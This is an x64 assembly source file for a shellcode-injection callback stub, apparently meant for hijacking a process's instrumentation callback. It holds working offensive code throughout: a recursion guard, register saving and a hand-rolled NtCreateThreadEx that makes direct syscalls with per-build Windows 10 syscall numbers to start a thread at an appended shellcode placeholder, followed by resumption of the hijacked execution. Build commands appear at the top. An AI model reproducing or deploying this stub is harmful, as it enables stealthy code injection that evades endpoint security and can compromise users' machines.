;C:\fasm\fasm.exe callback.asm callback.bin
;python bin2cbuffer.py callback.bin callback
use64

mov rdx, 0x7fffffffffff ; address of the global variable flag to check thread creation

;check if thread never run
cmp byte [rdx], 0
je callback_start

;avoid recursions
jmp restore_execution

;here starts the callback part that runs shellcode, this should run just 1st time
callback_start:
    push r10 ; contains old rip to restore execution
    push rax ; syscall return value

    ; why pushing these registers? -> https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019#callercallee-saved-registers
    push rbx
    push rbp
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15 

    ;shadow space should be 32 bytes + additional function parameters. Must be 32 also if function parameters are less than 4
    sub rsp, 32

    lea rcx, [shellcode_placeholder] ; address of the shellcode to run
    call DisposableHook

    ;restore stack shadow space
    add rsp, 32

    ;restore nonvolatile registers
    pop r15 
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx

    ;restore the return value
    pop rax

    ;restore old rip
    pop r10

restore_execution:
    jmp r10


;source DisposableHook.c -> DisposableHook.msvc.asm
DisposableHook:
    status$ = 96
    tHandle$ = 104
    objAttr$ = 112
    shellcodeAddr$ = 176
    threadCreated$ = 184

    ; 36   : void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {

	mov	QWORD [rsp+16], rdx
	mov	QWORD [rsp+8], rcx
	push rdi
	sub	rsp, 160				; 000000a0H

; 37   : 	NTSTATUS status;
; 38   : 	HANDLE tHandle = NULL;

	mov	QWORD [rsp+tHandle$], 0

; 39   : 	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };

	mov	DWORD [rsp+objAttr$], 48		; 00000030H
	lea	rax, QWORD [rsp+objAttr$+8]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 40					; 00000028H
	rep stosb

; 40   : 
; 41   : 	if (InterlockedExchange8((CHAR*)threadCreated, 1) == 1) //avoid recursion + check if another thread already run DisposableHook function

	mov	al, 1
	mov	rcx, QWORD [rsp+threadCreated$]
	xchg BYTE [rcx], al
	movsx eax, al
	cmp	eax, 1
	jne	SHORT LN2_Disposable

; 42   : 		return;

	jmp	SHORT LN1_Disposable
LN2_Disposable:

; 43   : 	status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, &objAttr, (HANDLE)-1, (LPVOID)shellcodeAddr, NULL, FALSE, 0, 0, 0, NULL);

	mov	QWORD [rsp+80], 0
	mov	DWORD [rsp+72], 0
	mov	DWORD [rsp+64], 0
	mov	DWORD [rsp+56], 0
	mov	DWORD [rsp+48], 0
	mov	QWORD [rsp+40], 0
	mov	rax, QWORD [rsp+shellcodeAddr$]
	mov	QWORD [rsp+32], rax
	mov	r9, -1
	lea	r8, QWORD [rsp+objAttr$]
	mov	edx, 536870912				; 20000000H
	lea	rcx, QWORD [rsp+tHandle$]
	call QWORD NtCreateThreadEx
	mov	DWORD [rsp+status$], eax

; 44   : 	if (status != 0)

	cmp	DWORD [rsp+status$], 0
	je SHORT LN3_Disposable

; 45   : 		InterlockedExchange8((CHAR*)threadCreated, 0); //thread creation failed, reset flag

	xor	eax, eax
	mov	rcx, QWORD [rsp+threadCreated$]
	xchg BYTE [rcx], al
LN3_Disposable:
LN1_Disposable:

; 46   : }

	add	rsp, 160				; 000000a0H
	pop	rdi
	ret	0
    

NtCreateThreadEx:
    mov rax, [gs:60h]
    cmp dword [rax+120h], 10240
    je  build_10240
    cmp dword [rax+120h], 10586
    je  build_10586
    cmp dword [rax+120h], 14393
    je  build_14393
    cmp dword [rax+120h], 15063
    je  build_15063
    cmp dword [rax+120h], 16299
    je  build_16299
    cmp dword [rax+120h], 17134
    je  build_17134
    cmp dword [rax+120h], 17763
    je  build_17763
    cmp dword [rax+120h], 18362
    je  build_18362
    cmp dword [rax+120h], 18363
    je  build_18363
    jg  build_preview
    jmp syscall_unknown
    build_10240:        ; Windows 10.0.10240 (1507)
        mov eax, 00b3h
        jmp do_syscall
    build_10586:        ; Windows 10.0.10586 (1511)
        mov eax, 00b4h
        jmp do_syscall
    build_14393:        ; Windows 10.0.14393 (1607)
        mov eax, 00b6h
        jmp do_syscall
    build_15063:        ; Windows 10.0.15063 (1703)
        mov eax, 00b9h
        jmp do_syscall
    build_16299:        ; Windows 10.0.16299 (1709)
        mov eax, 00bah
        jmp do_syscall
    build_17134:        ; Windows 10.0.17134 (1803)
        mov eax, 00bbh
        jmp do_syscall
    build_17763:        ; Windows 10.0.17763 (1809)
        mov eax, 00bch
        jmp do_syscall
    build_18362:        ; Windows 10.0.18362 (1903)
        mov eax, 00bdh
        jmp do_syscall
    build_18363:        ; Windows 10.0.18363 (1909)
        mov eax, 00bdh
        jmp do_syscall
    build_preview:      ; Windows Preview
        mov eax, 00c1h
        jmp do_syscall

    syscall_unknown:
        mov eax, -1
     
    do_syscall:
        mov r10, rcx
        syscall
        ret


shellcode_placeholder:
    nop
    ;from here will be appended the shellcode